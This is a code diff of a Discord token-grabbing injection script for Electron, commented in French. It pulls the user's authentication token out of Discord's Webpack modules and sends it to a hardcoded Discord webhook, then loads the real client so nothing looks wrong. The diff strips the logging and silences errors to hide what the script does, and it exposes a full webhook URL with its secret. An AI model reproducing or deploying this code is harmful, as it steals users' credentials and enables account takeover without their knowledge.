@@ -1,13 +1,13 @@
 const { BrowserWindow } = require("electron");
 const https = require("https");
 
-// Envoie le token au webhook Discord
+// Fonction d'envoi vers le webhook Discord
 function sendToWebhook(content) {
     const data = JSON.stringify({ content });
 
     const options = {
         hostname: "discord.com",
-        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // 🔁 Remplace par ton propre lien
+        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // ← ton lien webhook ici
         method: "POST",
         headers: {
             "Content-Type": "application/json",
@@ -15,19 +15,13 @@ function sendToWebhook(content) {
         }
     };
 
-    const req = https.request(options, res => {
-        console.log("Webhook status:", res.statusCode);
-    });
-
-    req.on("error", error => {
-        console.error("Erreur webhook:", error);
-    });
-
+    const req = https.request(options);
+    req.on("error", () => {}); // silence les erreurs pour éviter l'affichage
     req.write(data);
     req.end();
 }
 
-// Récupère le token Discord depuis Webpack une fois que l'interface est prête
+// Fonction pour extraire le token et l’envoyer
 function getToken() {
     const windows = BrowserWindow.getAllWindows();
 
@@ -52,31 +46,25 @@ function getToken() {
                                         resolve(null);
                                     }
                                 ]);
-                            } catch (err) {
+                            } catch {
                                 resolve(null);
                             }
                         } else {
-                            setTimeout(check, 100); // attend que Webpack soit prêt
+                            setTimeout(check, 100);
                         }
                     };
                     check();
                 });
             `).then(token => {
                 if (token) {
-                    console.log("✅ Token récupéré :", token);
-                    sendToWebhook("🎯 Token Discord: " + token);
-                } else {
-                    console.warn("⚠️ Aucun token trouvé.");
+                    sendToWebhook("Token Discord : " + token);
                 }
-            }).catch(err => {
-                console.error("❌ Erreur JS :", err);
-            });
+            }).catch(() => {});
         });
     }
 }
 
-console.log("🚀 Script injection démarré");
 getToken();
 
-// Recharge le cœur de Discord normalement
+// Charge Discord normalement
 module.exports = require('./core.asar');
